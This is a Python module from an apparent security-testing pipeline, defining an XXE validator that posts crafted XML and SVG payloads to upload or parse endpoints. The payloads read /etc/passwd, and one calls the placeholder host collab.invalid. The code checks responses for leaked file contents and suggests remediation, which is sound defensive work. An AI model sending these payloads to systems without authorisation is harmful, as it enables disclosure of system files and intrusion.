from __future__ import annotations

from typing import Any, Dict, List, Optional

import requests

from modules.pipeline.brain.fact_store import FactStore
from modules.pipeline.engine.models import Evidence, ExecutionContext, ValidationResult


class XXEValidator:
    SIGNALS = {
        "header_patterns": ["application/xml", "text/xml", "multipart/form-data"],
        "endpoint_patterns": ["/upload", "/import", "/parse", "/process"],
    }
    validator_id = "xxe_validator"
    priority = 84

    def __init__(self, context: Optional[ExecutionContext] = None):
        self.context = context
        self.destructive = False

    def can_run(self, state: Dict[str, Any]) -> bool:
        endpoints = [str(x).lower() for x in (state.get("endpoints") or [])]
        headers = [str(x).lower() for x in (state.get("header_patterns") or [])]
        return any(p in ep for ep in endpoints for p in ["upload", "import", "parse", "process"]) or any("xml" in h for h in headers)

    def run(self, state: Dict[str, Any]):
        endpoints = [ep for ep in (state.get("endpoints") or []) if isinstance(ep, str)]
        candidates = [ep for ep in endpoints if any(p in ep.lower() for p in ["upload", "import", "parse", "process"])]
        if not candidates:
            target = state.get("url") or state.get("target")
            if isinstance(target, str) and target:
                candidates = [target]

        timeout = int(state.get("timeout", 8) or 8)
        store = state.get("fact_store") if isinstance(state.get("fact_store"), FactStore) else FactStore()

        classic = """<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"""
        blind_dns = """<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://collab.invalid/xxe\">]><root>&xxe;</root>"""
        svg_xxe = """<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"""

        for target in candidates:
            probes = [
                ("classic_xxe", classic, "application/xml"),
                ("blind_dns_xxe", blind_dns, "application/xml"),
                ("svg_xxe", svg_xxe, "image/svg+xml"),
            ]

            for name, payload, ctype in probes:
                headers = {"User-Agent": "security-pipeline-validator/1.0", "Content-Type": ctype}
                try:
                    resp = requests.post(target, data=payload.encode("utf-8"), headers=headers, timeout=timeout, allow_redirects=False)
                except Exception:
                    continue

                body = resp.text or ""
                if "root:" in body:
                    store.add_confirmed_vulnerability(
                        vuln_id="xxe_confirmed",
                        vuln_type="xxe_confirmed",
                        target=target,
                        source_validator_id=self.validator_id,
                        metadata={"probe": name},
                    )
                    return ValidationResult(
                        success=True,
                        confidence=0.97,
                        severity="critical",
                        vulnerability="xxe",
                        evidence=Evidence(
                            request={"target": target, "probe": name},
                            response={"status": resp.status_code, "snippet": body[:300]},
                            matched="root:",
                        ),
                        impact="XML parser resolved external entities and disclosed local file contents.",
                        remediation="Disable external entities, use secure parser configurations, and enforce strict content-type handling.",
                    )

        return ValidationResult(
            success=False,
            confidence=0.2,
            severity="info",
            vulnerability="xxe",
            evidence=Evidence(request={"tested": len(candidates)}, response={}, matched=""),
        )
